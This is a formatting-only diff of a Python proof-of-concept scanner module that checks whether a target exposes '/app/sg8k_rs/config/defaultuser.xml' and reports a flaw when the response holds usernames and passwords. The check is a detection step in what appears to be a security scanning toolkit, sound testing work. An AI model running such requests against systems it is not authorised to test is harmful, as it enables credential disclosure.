@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -50,7 +51,7 @@ class Poc(ABPoc):
             p = "/app/sg8k_rs/config/defaultuser.xml"
             url = arg + p
             code2, head, res, errcode, _ = hh.http(url)
-            #print res ,code2
+            # print res ,code2
             if (code2 == 200) and ('username' in res) and ('<?xml version' in res) and ('password' in res):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
